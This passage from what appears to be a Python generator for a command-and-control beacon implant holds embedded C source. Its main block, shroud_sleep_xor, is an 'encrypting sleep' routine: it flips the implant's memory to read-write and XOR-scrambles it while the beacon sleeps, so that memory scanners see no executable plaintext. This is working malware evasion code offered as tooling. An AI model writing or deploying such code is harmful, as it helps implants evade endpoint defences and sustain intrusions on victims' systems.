            }
            break;
        }
    }
}
"""

# ---------------------------------------------------------------------------
# ENCRYPTING SLEEP — while the beacon sleeps, the payload region is flipped to
# RW and XOR-scrambled so a memory scanner sees no executable plaintext. XOR is
# symmetric, so the same routine decrypts on wake. (Intended to be called from
# the beacon's sleep path; a self-contained demo also uses it.)
# ---------------------------------------------------------------------------
SLEEP_ENC = r"""
static void shroud_sleep_xor(void* base, SIZE_T len, const unsigned char* key, unsigned int klen, DWORD ms) {
    DWORD old = 0;
    VirtualProtect(base, len, PAGE_READWRITE, &old);        /* drop RX */
    xor_decrypt((unsigned char*)base, (unsigned int)len, key, klen);  /* scramble (symmetric) */
    Sleep(ms);
    xor_decrypt((unsigned char*)base, (unsigned int)len, key, klen);  /* unscramble */
    VirtualProtect(base, len, old, &old);                    /* restore */
    FlushInstructionCache(GetCurrentProcess(), base, len);
}
"""
